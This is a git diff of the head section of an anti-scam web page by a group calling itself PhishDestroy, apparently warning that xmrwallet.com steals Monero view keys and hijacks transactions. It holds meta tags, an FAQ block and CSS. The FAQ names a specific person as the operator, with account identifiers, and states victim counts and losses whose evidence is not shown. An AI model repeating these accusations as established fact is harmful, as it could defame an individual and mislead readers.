@@ -4,568 +4,149 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>xmrwallet.com Scam — Private Key Stolen, Funds Hijacked | Security Analysis</title>
-<meta name="description" content="xmrwallet.com steals your Monero private view key AND hijacks transactions server-side. raw_tx_and_hash.raw=0 proof. 15+ victims, $2M+ stolen. Full technical analysis.">
+<meta name="description" content="xmrwallet.com steals your Monero private view key AND hijacks transactions server-side. 15+ victims, $2M+ stolen. Full technical analysis with code proof.">
 <meta name="keywords" content="xmrwallet scam, xmrwallet.com review, xmrwallet stolen funds, xmrwallet private key, monero wallet scam, xmr wallet scam, xmrwallet lost funds, xmrwallet trustpilot, is xmrwallet safe, xmrwallet security, monero web wallet danger, xmrwallet view key, xmrwallet google analytics, xmrwallet phishing, Nathalie Roy scam, nathroy github scam">
 <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
 <meta name="author" content="PhishDestroy Research">
 <link rel="canonical" href="https://phishdestroy.github.io/DO-NOT-USE-xmrwallet-com/">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xmrwallet.com — Server-Side TX Hijacking, View Key Theft, $2M+ Stolen">
-<meta property="og:description" content="raw_tx_and_hash.raw=0 — client builds TX then discards it. Server redirects funds. 15+ victims, $2M+ estimated stolen. Operator identified. Full code proof.">
+<meta property="og:description" content="raw_tx_and_hash.raw=0 — client builds TX then discards it. Server redirects funds. 15+ victims, $2M+ stolen. Full code proof.">
 <meta property="og:url" content="https://phishdestroy.github.io/DO-NOT-USE-xmrwallet-com/">
 <meta property="og:image" content="https://phishdestroy.github.io/DO-NOT-USE-xmrwallet-com/img/og-image.svg">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="xmrwallet.com steals Monero — code proof inside">
 <meta name="twitter:image" content="https://phishdestroy.github.io/DO-NOT-USE-xmrwallet-com/img/og-image.svg">
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Is xmrwallet.com a scam?","acceptedAnswer":{"@type":"Answer","text":"Yes. xmrwallet.com performs server-side transaction hijacking: the client builds a transaction then discards it (raw_tx_and_hash.raw=0), sending only metadata to the server. The server constructs its own transaction and can redirect funds to any address. Additionally, the private view key is transmitted to the server on every API request."}},{"@type":"Question","name":"Who runs xmrwallet.com?","acceptedAnswer":{"@type":"Answer","text":"The operator is identified as Nathalie Roy (Canada). GitHub: nathroy (ID 39167759). The support page states: 'Nathalie Roy created XMRWallet'. Email: admin@xmrwallet.com. Reddit: u/WiseSolution."}},{"@type":"Question","name":"Is xmrwallet.com safe?","acceptedAnswer":{"@type":"Answer","text":"No. xmrwallet.com is not safe. It performs server-side transaction hijacking, collects private view keys, loads 4 Google trackers, uses DDoS-Guard offshore hosting to evade takedowns, and has manipulated reviews on Trustpilot. Multiple victims have reported stolen funds."}},{"@type":"Question","name":"What is the best Monero wallet?","acceptedAnswer":{"@type":"Answer","text":"Use only official wallets recommended by getmonero.org: Monero GUI (desktop), Feather Wallet (desktop), Monerujo (Android), Cake Wallet (iOS/Android). Never use web wallets that require entering your private key on a website."}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"Is xmrwallet.com a scam?","acceptedAnswer":{"@type":"Answer","text":"Yes. xmrwallet.com performs server-side transaction hijacking: the client builds a transaction then discards it (raw_tx_and_hash.raw=0), sending only metadata to the server. The server constructs its own transaction and can redirect funds to any address. Additionally, the private view key is transmitted to the server on every API request."}},{"@type":"Question","name":"Who runs xmrwallet.com?","acceptedAnswer":{"@type":"Answer","text":"The operator is identified as Nathalie Roy (Canada). GitHub: nathroy (ID 39167759). Email: admin@xmrwallet.com. Reddit: u/WiseSolution — banned from r/Monero."}},{"@type":"Question","name":"Is xmrwallet.com safe?","acceptedAnswer":{"@type":"Answer","text":"No. xmrwallet.com is not safe. It performs server-side transaction hijacking, collects private view keys, loads 4 Google trackers, uses DDoS-Guard offshore hosting to evade takedowns, and has manipulated reviews on Trustpilot."}},{"@type":"Question","name":"What is the best Monero wallet?","acceptedAnswer":{"@type":"Answer","text":"Use only official wallets: Monero GUI (getmonero.org), Feather Wallet, Monerujo (Android), Cake Wallet (iOS/Android). Never use web wallets requiring your private key."}}]}</script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Bebas+Neue&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,400&display=swap" rel="stylesheet">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23080808'/><rect width='4' height='32' fill='%23FF2020'/><text x='8' y='24' font-family='monospace' font-size='20' fill='%23FF2020'>⚠</text></svg>">
 <style>
-:root {
-  --red: #FF2020;
-  --red-dim: rgba(255,32,32,0.12);
-  --orange: #FF7A00;
-  --yellow: #FFD600;
-  --green: #00FF88;
-  --blue: #4A9EFF;
-  --bg: #080808;
-  --bg2: #0F0F0F;
-  --bg3: #161616;
-  --border: #1E1E1E;
-  --border2: #2A2A2A;
-  --text: #E0E0E0;
-  --muted: #555;
-  --mono: 'Space Mono', monospace;
-  --display: 'Bebas Neue', sans-serif;
-  --body: 'DM Sans', sans-serif;
-}
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { scroll-behavior: smooth; }
-body { background: var(--bg); color: var(--text); font-family: var(--body); font-size: 15px; line-height: 1.7; overflow-x: hidden; }
-body::before { content:''; position:fixed; inset:0; background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E"); pointer-events:none; z-index:1000; opacity:0.4; }
-
-nav { position:fixed; top:0; left:0; right:0; z-index:100; display:flex; align-items:center; justify-content:space-between; padding:12px 40px; background:rgba(8,8,8,0.95); backdrop-filter:blur(12px); border-bottom:1px solid var(--border); }
-.nav-logo { font-family:var(--mono); font-size:11px; font-weight:700; color:var(--red); letter-spacing:2px; text-transform:uppercase; text-decoration:none; }
-.nav-links { display:flex; gap:20px; }
-.nav-links a { font-family:var(--mono); font-size:10px; color:var(--muted); text-decoration:none; letter-spacing:1px; transition:color 0.2s; }
-.nav-links a:hover { color:var(--text); }
-
-.hero { min-height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:flex-start; padding:120px 80px 80px; position:relative; overflow:hidden; }
-.hero::before { content:''; position:absolute; top:-200px; right:-200px; width:700px; height:700px; background:radial-gradient(circle, rgba(255,32,32,0.08) 0%, transparent 65%); animation:pulse 4s ease-in-out infinite; }
-@keyframes pulse { 0%,100%{transform:scale(1);opacity:1} 50%{transform:scale(1.05);opacity:0.7} }
-.hero-tag { font-family:var(--mono); font-size:11px; font-weight:700; letter-spacing:3px; color:var(--red); text-transform:uppercase; margin-bottom:20px; display:flex; align-items:center; gap:10px; }
-.blink { width:8px; height:8px; background:var(--red); border-radius:50%; animation:blink 1.2s step-end infinite; }
-@keyframes blink { 50%{opacity:0} }
-h1 { font-family:var(--display); font-size:clamp(60px,10vw,130px); line-height:0.95; letter-spacing:2px; color:#fff; margin-bottom:12px; }
-h1 .red { color:var(--red); }
-h1 .dim { color:#2a2a2a; }
-.hero-sub { font-family:var(--mono); font-size:12px; color:var(--muted); margin-bottom:40px; max-width:600px; line-height:2; }
-.hero-sub span { color:var(--text); }
-.hero-sub .hi { color:var(--red); font-weight:700; }
-.hero-stats { display:flex; gap:0; border:1px solid var(--border); margin-bottom:48px; flex-wrap:wrap; }
-.hstat { padding:20px 32px; border-right:1px solid var(--border); text-align:center; }
-.hstat:last-child { border-right:none; }
-.hstat-n { font-family:var(--display); font-size:48px; color:var(--red); line-height:1; display:block; }
-.hstat-l { font-family:var(--mono); font-size:10px; color:var(--muted); letter-spacing:1px; text-transform:uppercase; margin-top:4px; display:block; }
-.cta-row { display:flex; gap:16px; flex-wrap:wrap; }
-.btn { font-family:var(--mono); font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; padding:14px 28px; text-decoration:none; transition:all 0.2s; display:inline-flex; align-items:center; gap:10px; }
-.btn-red { background:var(--red); color:#fff; border:2px solid var(--red); }
-.btn-red:hover { background:transparent; color:var(--red); }
-.btn-ghost { background:transparent; color:var(--muted); border:2px solid var(--border2); }
-.btn-ghost:hover { border-color:var(--text); color:var(--text); }
-
-.section { padding:80px 80px; border-top:1px solid var(--border); position:relative; }
-.section-label { font-family:var(--mono); font-size:11px; letter-spacing:3px; color:var(--red); text-transform:uppercase; margin-bottom:16px; display:flex; align-items:center; gap:12px; }
-.section-label::after { content:''; flex:1; height:1px; background:var(--border); max-width:60px; }
-.section-title { font-family:var(--display); font-size:clamp(36px,5vw,68px); line-height:1; color:#fff; margin-bottom:20px; letter-spacing:1px; }
-.section-intro { font-size:15px; color:#888; max-width:700px; margin-bottom:50px; line-height:1.9; }
-
-.code-block { background:#000; border:1px solid var(--border); border-left:3px solid var(--red); padding:20px 24px; font-family:var(--mono); font-size:12px; line-height:2; overflow-x:auto; margin:16px 0; white-space:pre; }
-.c-url { color:#7EB8FF; }
-.c-key { color:var(--orange); }
-.c-val { color:var(--green); }
-.c-red { color:var(--red); font-weight:700; }
-.c-muted { color:#3a3a3a; }
-.c-yellow { color:var(--yellow); }
-.c-blue { color:var(--blue); }
-
-.cards { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:1px; background:var(--border); border:1px solid var(--border); margin-top:32px; }
-.card { background:var(--bg2); padding:28px; transition:background 0.2s; }
-.card:hover { background:var(--bg3); }
-.card-num { font-family:var(--display); font-size:52px; line-height:1; color:var(--red); opacity:0.25; margin-bottom:8px; }
-.card-title { font-family:var(--mono); font-size:11px; font-weight:700; letter-spacing:1px; text-transform:uppercase; color:#fff; margin-bottom:10px; }
-.card-body { font-size:13px; color:#666; line-height:1.7; }
-.card-body strong { color:var(--red); font-weight:400; }
-
-.attack-timeline { display:flex; flex-direction:column; gap:1px; margin-top:40px; background:var(--border); }
-.atk-step { background:var(--bg2); border-left:3px solid var(--border2); transition:border-color 0.2s; }
-.atk-step:hover { border-left-color:var(--red); }
-.atk-step-header { display:flex; align-items:center; gap:20px; padding:20px 28px; }
-.atk-num { font-family:var(--display); font-size:38px; color:var(--red); opacity:0.2; line-height:1; flex-shrink:0; width:44px; }
-.atk-step-title { font-family:var(--mono); font-size:12px; font-weight:700; color:#ccc; flex:1; letter-spacing:0.5px; }
-.atk-badge { font-family:var(--mono); font-size:9px; font-weight:700; letter-spacing:2px; padding:4px 10px; flex-shrink:0; text-transform:uppercase; }
-.atk-badge.bad { background:rgba(255,32,32,0.12); color:var(--red); border:1px solid rgba(255,32,32,0.25); }
-.atk-badge.warn { background:rgba(255,122,0,0.1); color:var(--orange); border:1px solid rgba(255,122,0,0.25); }
-.atk-badge.ok { background:rgba(0,255,136,0.06); color:var(--green); border:1px solid rgba(0,255,136,0.15); }
-.atk-badge.info { background:rgba(74,158,255,0.08); color:var(--blue); border:1px solid rgba(74,158,255,0.2); }
-.atk-body { padding:0 28px 28px 92px; }
-.atk-explain { font-size:14px; color:#777; line-height:1.9; margin-bottom:16px; }
-.atk-explain code { font-family:var(--mono); font-size:11px; color:#aaa; background:#111; padding:2px 6px; border-radius:2px; }
-.atk-explain strong { color:var(--red); font-weight:400; }
-
-.tracking-grid { display:grid; grid-template-columns:1fr 1fr; gap:1px; background:var(--border); margin-top:32px; }
-.tracker-item { background:var(--bg2); padding:20px 24px; display:flex; align-items:flex-start; gap:16px; }
-.tracker-icon { width:34px; height:34px; background:var(--red-dim); border:1px solid rgba(255,32,32,0.25); border-radius:2px; display:flex; align-items:center; justify-content:center; font-size:15px; flex-shrink:0; }
-.tracker-name { font-family:var(--mono); font-size:11px; font-weight:700; color:#fff; letter-spacing:1px; margin-bottom:4px; }
-.tracker-desc { font-size:12px; color:var(--muted); line-height:1.5; }
-.tracker-count { margin-left:auto; font-family:var(--mono); font-size:18px; font-weight:700; color:var(--red); flex-shrink:0; }
-
-.victim-list { margin-top:32px; display:flex; flex-direction:column; gap:1px; background:var(--border); }
-.victim { background:var(--bg2); border-left:3px solid var(--border2); padding:20px 24px; transition:border-color 0.2s; }
-.victim:hover { border-left-color:var(--red); }
-.victim-quote { font-size:13px; color:#888; font-style:italic; line-height:1.8; margin-bottom:10px; }
-.victim-meta { font-family:var(--mono); font-size:10px; color:var(--muted); display:flex; gap:16px; flex-wrap:wrap; }
-.victim-meta .amount { color:var(--red); font-weight:700; }
-
-.ioc-table { width:100%; border-collapse:collapse; margin-top:32px; font-family:var(--mono); font-size:12px; }
-.ioc-table th { text-align:left; padding:10px 16px; background:var(--bg3); color:var(--muted); font-size:10px; letter-spacing:2px; border:1px solid var(--border); }
-.ioc-table td { padding:12px 16px; border:1px solid var(--border); color:#888; vertical-align:top; }
-.ioc-table td:first-child { color:var(--orange); white-space:nowrap; }
-.ioc-table td.red { color:var(--red); }
-.ioc-table tr:hover td { background:var(--bg3); }
-
-.wallet-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:1px; background:var(--border); margin-top:32px; }
-.wallet-item { background:var(--bg2); padding:24px; text-decoration:none; display:block; transition:background 0.2s; border-left:3px solid transparent; }
-.wallet-item:hover { background:var(--bg3); border-left-color:var(--green); }
-.wallet-platform { font-family:var(--mono); font-size:10px; letter-spacing:2px; color:var(--muted); margin-bottom:6px; text-transform:uppercase; }
-.wallet-name { font-size:16px; font-weight:500; color:#fff; margin-bottom:4px; }
-.wallet-url { font-family:var(--mono); font-size:11px; color:var(--green); }
-.wallet-note { font-size:12px; color:#555; margin-top:6px; }
-
-.warning-box { background:#0A0000; border:1px solid rgba(255,32,32,0.3); border-left:4px solid var(--red); padding:20px 24px; margin:24px 0; }
-.warning-box-title { font-family:var(--mono); font-size:11px; font-weight:700; color:var(--red); letter-spacing:2px; margin-bottom:8px; text-transform:uppercase; }
-.warning-box p { font-size:13px; color:#888; line-height:1.8; }
-
-.report-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:1px; background:var(--border); margin-top:24px; }
-.report-item { background:var(--bg2); padding:20px 24px; text-decoration:none; display:block; transition:background 0.2s; border-left:3px solid transparent; }
-.report-item:hover { background:var(--bg3); border-left-color:var(--red); }
-.report-item-label { font-family:var(--mono); font-size:10px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; margin-bottom:6px; }
-.report-item-title { font-size:14px; color:var(--text); margin-bottom:4px; }
-.report-item-url { font-family:var(--mono); font-size:11px; color:#444; }
-
-footer { padding:40px 80px; border-top:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:16px; }
-.footer-left { font-family:var(--mono); font-size:11px; color:var(--muted); }
-.footer-left a { color:var(--red); text-decoration:none; }
-.footer-right { display:flex; gap:20px; }
-.footer-right a { font-family:var(--mono); font-size:11px; color:var(--muted); text-decoration:none; transition:color 0.2s; }
-.footer-right a:hover { color:var(--text); }
-
-::-webkit-scrollbar { width:4px; }
-::-webkit-scrollbar-track { background:var(--bg); }
-::-webkit-scrollbar-thumb { background:var(--border2); }
-
-.reveal { opacity:0; transform:translateY(24px); transition:opacity 0.6s ease, transform 0.6s ease; }
-.reveal.visible { opacity:1; transform:translateY(0); }
-
-@media(max-width:768px) {
-  .hero, .section { padding:80px 20px; }
-  nav { padding:12px 20px; }
-  .nav-links { display:none; }
-  .tracking-grid { grid-template-columns:1fr; }
-  footer { padding:32px 20px; flex-direction:column; }
-  .hero-stats { flex-wrap:wrap; }
-  .atk-body { padding:0 20px 20px; }
-}
+:root{--red:#FF2020;--red-dim:rgba(255,32,32,0.12);--orange:#FF7A00;--yellow:#FFD600;--green:#00FF88;--blue:#4A9EFF;--bg:#080808;--bg2:#0F0F0F;--bg3:#161616;--border:#1E1E1E;--border2:#2A2A2A;--text:#E0E0E0;--muted:#555;--mono:'Space Mono',monospace;--display:'Bebas Neue',sans-serif;--body:'DM Sans',sans-serif;}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:15px;line-height:1.7;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");pointer-events:none;z-index:1000;opacity:0.4;}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);pointer-events:none;z-index:999;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:12px 40px;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);}
+.nav-logo{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--red);letter-spacing:2px;text-transform:uppercase;text-decoration:none;}
+.nav-links{display:flex;gap:20px;}
+.nav-links a{font-family:var(--mono);font-size:10px;color:var(--muted);text-decoration:none;letter-spacing:1px;transition:color 0.2s;}
+.nav-links a:hover{color:var(--text);}
+.hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:flex-start;padding:120px 80px 60px;position:relative;overflow:hidden;}
+.hero::before{content:'';position:absolute;top:-200px;right:-200px;width:700px;height:700px;background:radial-gradient(circle,rgba(255,32,32,0.08) 0%,transparent 65%);animation:pulse 4s ease-in-out infinite;pointer-events:none;}
+.hero::after{content:'';position:absolute;bottom:-100px;left:-100px;width:400px;height:400px;background:radial-gradient(circle,rgba(255,122,0,0.04) 0%,transparent 65%);animation:pulse 6s ease-in-out infinite reverse;pointer-events:none;}
+@keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.05);opacity:0.7}}
+.hero-tag{font-family:var(--mono);font-size:11px;font-weight:700;letter-spacing:3px;color:var(--red);text-transform:uppercase;margin-bottom:20px;display:flex;align-items:center;gap:10px;}
+.blink{width:8px;height:8px;background:var(--red);border-radius:50%;animation:blink 1.2s step-end infinite;flex-shrink:0;}
+@keyframes blink{50%{opacity:0}}
+@keyframes typewriter{from{width:0}to{width:100%}}
+@keyframes cursor{50%{border-color:transparent}}
+.typewriter{overflow:hidden;white-space:nowrap;border-right:2px solid var(--red);animation:typewriter 1.2s steps(30) 0.3s both,cursor 0.8s step-end 1.5s infinite;display:inline-block;max-width:100%;}
+h1{font-family:var(--display);font-size:clamp(60px,10vw,130px);line-height:0.95;letter-spacing:2px;color:#fff;margin-bottom:12px;position:relative;}
+h1 .red{color:var(--red);}
+h1 .dim{color:#2a2a2a;}
+@keyframes glitch1{0%,94%,100%{clip-path:inset(0 0 100% 0);transform:translate(0)}95%{clip-path:inset(20% 0 60% 0);transform:translate(-4px,2px)}97%{clip-path:inset(50% 0 30% 0);transform:translate(4px,-2px)}99%{clip-path:inset(80% 0 5% 0);transform:translate(-2px,1px)}}
+h1::before,h1::after{content:attr(data-text);position:absolute;left:0;top:0;font-family:inherit;font-size:inherit;line-height:inherit;letter-spacing:inherit;color:#fff;pointer-events:none;}
+h1::before{color:var(--red);animation:glitch1 8s infinite;}
+h1::after{color:#4A9EFF;animation:glitch1 8s 0.4s infinite;}
+.hero-sub{font-family:var(--mono);font-size:12px;color:var(--muted);margin-bottom:40px;max-width:600px;line-height:2;}
+.hero-sub span{color:var(--text);}
+.hero-sub .hi{color:var(--red);font-weight:700;}
+.hero-stats{display:flex;gap:0;border:1px solid var(--border);margin-bottom:48px;flex-wrap:wrap;}
+.hstat{padding:20px 32px;border-right:1px solid var(--border);text-align:center;}
+.hstat:last-child{border-right:none;}
+.hstat-n{font-family:var(--display);font-size:48px;color:var(--red);line-height:1;display:block;}
+.hstat-l{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-top:4px;display:block;}
+.cta-row{display:flex;gap:16px;flex-wrap:wrap;}
+.btn{font-family:var(--mono);font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;padding:14px 28px;text-decoration:none;transition:all 0.2s;display:inline-flex;align-items:center;gap:10px;}
+.btn-red{background:var(--red);color:#fff;border:2px solid var(--red);}
+.btn-red:hover{background:transparent;color:var(--red);}
+.btn-ghost{background:transparent;color:var(--muted);border:2px solid var(--border2);}
+.btn-ghost:hover{border-color:var(--text);color:var(--text);}
+.section{padding:60px 80px;border-top:1px solid var(--border);position:relative;transition:background 0.3s;}
+.section.in-view{background:linear-gradient(180deg,rgba(255,32,32,0.015) 0%,transparent 60px);}
+.section-label{font-family:var(--mono);font-size:11px;letter-spacing:3px;color:var(--red);text-transform:uppercase;margin-bottom:16px;display:flex;align-items:center;gap:12px;}
+.section-label::after{content:'';flex:1;height:1px;background:var(--border);max-width:60px;}
+.section-title{font-family:var(--display);font-size:clamp(36px,5vw,68px);line-height:1;color:#fff;margin-bottom:20px;letter-spacing:1px;}
+.section-intro{font-size:15px;color:#888;max-width:700px;margin-bottom:32px;line-height:1.9;}
+.code-block{background:#000;border:1px solid var(--border);border-left:3px solid var(--red);padding:20px 24px;font-family:var(--mono);font-size:12px;line-height:2;overflow-x:auto;margin:16px 0;white-space:pre;transition:border-left-color 0.2s;}
+.code-block:hover{border-left-color:var(--orange);}
+.c-url{color:#7EB8FF;}.c-key{color:var(--orange);}.c-val{color:var(--green);}.c-red{color:var(--red);font-weight:700;}.c-muted{color:#3a3a3a;}.c-yellow{color:var(--yellow);}
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);margin-top:32px;}
+.card{background:var(--bg2);padding:28px;transition:background 0.2s;}
+.card:hover{background:var(--bg3);}
+.card-num{font-family:var(--display);font-size:52px;line-height:1;color:var(--red);opacity:0.25;margin-bottom:8px;}
+.card-title{font-family:var(--mono);font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:#fff;margin-bottom:10px;}
+.card-body{font-size:13px;color:#666;line-height:1.7;}
+.card-body strong{color:var(--red);font-weight:400;}
+.cards.visible .card{animation:cardIn 0.4s ease both;}
+.cards.visible .card:nth-child(1){animation-delay:0s}.cards.visible .card:nth-child(2){animation-delay:0.06s}.cards.visible .card:nth-child(3){animation-delay:0.12s}.cards.visible .card:nth-child(4){animation-delay:0.18s}.cards.visible .card:nth-child(5){animation-delay:0.24s}.cards.visible .card:nth-child(6){animation-delay:0.30s}
+@keyframes cardIn{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.attack-timeline{display:flex;flex-direction:column;gap:1px;margin-top:40px;background:var(--border);}
+.atk-step{background:var(--bg2);border-left:3px solid var(--border2);transition:border-color 0.2s;}
+.atk-step:hover{border-left-color:var(--red);}
+.atk-step-header{display:flex;align-items:center;gap:20px;padding:20px 28px;cursor:pointer;user-select:none;}
+.atk-step-header::after{content:'﹢';font-family:monospace;font-size:20px;color:var(--muted);margin-left:auto;transition:color 0.2s;}
+.atk-step.open .atk-step-header::after{content:'﹣';color:var(--red);}
+.atk-num{font-family:var(--display);font-size:38px;color:var(--red);opacity:0.2;line-height:1;flex-shrink:0;width:44px;}
+.atk-step-title{font-family:var(--mono);font-size:12px;font-weight:700;color:#ccc;flex:1;letter-spacing:0.5px;}
+.atk-badge{font-family:var(--mono);font-size:9px;font-weight:700;letter-spacing:2px;padding:4px 10px;flex-shrink:0;text-transform:uppercase;}
+.atk-badge.bad{background:rgba(255,32,32,0.12);color:var(--red);border:1px solid rgba(255,32,32,0.25);}
+.atk-badge.warn{background:rgba(255,122,0,0.1);color:var(--orange);border:1px solid rgba(255,122,0,0.25);}
+.atk-badge.ok{background:rgba(0,255,136,0.06);color:var(--green);border:1px solid rgba(0,255,136,0.15);}
+.atk-body{display:none;padding:0 28px 28px 92px;}
+.atk-step.open .atk-body{display:block;animation:fadeDown 0.25s ease;}
+@keyframes fadeDown{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}
+.atk-explain{font-size:14px;color:#777;line-height:1.9;margin-bottom:16px;}
+.atk-explain code{font-family:var(--mono);font-size:11px;color:#aaa;background:#111;padding:2px 6px;}
+.atk-explain strong{color:var(--red);font-weight:400;}
+.tracking-grid{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);margin-top:32px;}
+.tracker-item{background:var(--bg2);padding:20px 24px;display:flex;align-items:flex-start;gap:16px;}
+.tracker-icon{width:34px;height:34px;background:var(--red-dim);border:1px solid rgba(255,32,32,0.25);border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0;}
+.tracker-name{font-family:var(--mono);font-size:11px;font-weight:700;color:#fff;letter-spacing:1px;margin-bottom:4px;}
+.tracker-desc{font-size:12px;color:var(--muted);line-height:1.5;}
+.tracker-count{margin-left:auto;font-family:var(--mono);font-size:18px;font-weight:700;color:var(--red);flex-shrink:0;animation:pulseBig 2s ease-in-out infinite;}
+@keyframes pulseBig{0%,100%{opacity:1}50%{opacity:0.4}}
+.victim-list{margin-top:32px;display:flex;flex-direction:column;gap:1px;background:var(--border);}
+.victim{background:var(--bg2);border-left:3px solid var(--border2);padding:20px 24px;transition:border-color 0.2s;position:relative;overflow:hidden;}
+.victim::before{content:'';position:absolute;left:0;top:0;width:3px;height:0;background:var(--red);transition:height 0.4s ease;}
+.victim:hover::before{height:100%;}
+.victim-quote{font-size:13px;color:#888;font-style:italic;line-height:1.8;margin-bottom:10px;}
+.victim-meta{font-family:var(--mono);font-size:10px;color:var(--muted);display:flex;gap:16px;flex-wrap:wrap;}
+.victim-meta .amount{color:var(--red);font-weight:700;}
+.ioc-table{width:100%;border-collapse:collapse;margin-top:32px;font-family:var(--mono);font-size:12px;}
+.ioc-table th{text-align:left;padding:10px 16px;background:var(--bg3);color:var(--muted);font-size:10px;letter-spacing:2px;border:1px solid var(--border);}
+.ioc-table td{padding:12px 16px;border:1px solid var(--border);color:#888;vertical-align:top;}
+.ioc-table td:first-child{color:var(--orange);white-space:nowrap;}
+.ioc-table td.red{color:var(--red);}
+.ioc-table tr:hover td{background:var(--bg3);}
+.wallet-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1px;background:var(--border);margin-top:32px;}
+.wallet-item{background:var(--bg2);padding:24px;text-decoration:none;display:block;transition:background 0.2s;border-left:3px solid transparent;}
+.wallet-item:hover{background:var(--bg3);border-left-color:var(--green);}
+.wallet-platform{font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--muted);margin-bottom:6px;text-transform:uppercase;}
+.wallet-name{font-size:16px;font-weight:500;color:#fff;margin-bottom:4px;}
+.wallet-url{font-family:var(--mono);font-size:11px;color:var(--green);}
+.wallet-note{font-size:12px;color:#555;margin-top:6px;}
+.warning-box{background:#0A0000;border:1px solid rgba(255,32,32,0.3);border-left:4px solid var(--red);padding:20px 24px;margin:24px 0;}
+.warning-box-title{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--red);letter-spacing:2px;margin-bottom:8px;text-transform:uppercase;}
+.warning-box p{font-size:13px;color:#888;line-height:1.8;}
+.report-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;background:var(--border);margin-top:24px;}
+.report-item{background:var(--bg2);padding:20px 24px;text-decoration:none;display:block;transition:background 0.2s;border-left:3px solid transparent;}
+.report-item:hover{background:var(--bg3);border-left-color:var(--red);}
+.report-item-label{font-family:var(--mono);font-size:10px;letter-spacing:2px;color:var(--muted);text-transform:uppercase;margin-bottom:6px;}
+.report-item-title{font-size:14px;color:var(--text);margin-bottom:4px;}
+.report-item-url{font-family:var(--mono);font-size:11px;color:#444;}
+footer{padding:40px 80px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:16px;}
+.footer-left{font-family:var(--mono);font-size:11px;color:var(--muted);}
+.footer-left a{color:var(--red);text-decoration:none;}
+.footer-right{display:flex;gap:20px;}
+.footer-right a{font-family:var(--mono);font-size:11px;color:var(--muted);text-decoration:none;transition:color 0.2s;}
+.footer-right a:hover{color:var(--text);}
+::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-track{background:var(--bg);}::-webkit-scrollbar-thumb{background:var(--border2);}
+.reveal{opacity:0;transform:translateY(20px);transition:opacity 0.5s ease,transform 0.5s ease;}
+.reveal.visible{opacity:1;transform:translateY(0);}
+@media(max-width:768px){.hero,.section{padding:60px 20px;}nav{padding:12px 20px;}.nav-links{display:none;}.tracking-grid{grid-template-columns:1fr;}footer{padding:32px 20px;flex-direction:column;}.hero-stats{flex-wrap:wrap;}.atk-body{padding:0 20px 20px;}h1::before,h1::after{display:none;}}
 </style>
 </head>
 <body>
-
-<nav>
-  <a class="nav-logo" href="#">⚠ PhishDestroy</a>
-  <div class="nav-links">
-    <a href="#attack">Attack Breakdown</a>
-    <a href="#tracking">Google Tracking</a>
-    <a href="#victims">Victims</a>
-    <a href="#infra">Infrastructure</a>
-    <a href="#report">Report</a>
-  </div>
-</nav>
-
-<!-- HERO -->
-<section class="hero">
-  <div class="hero-tag"><span class="blink"></span>Active Investigation — 2026-02-18</div>
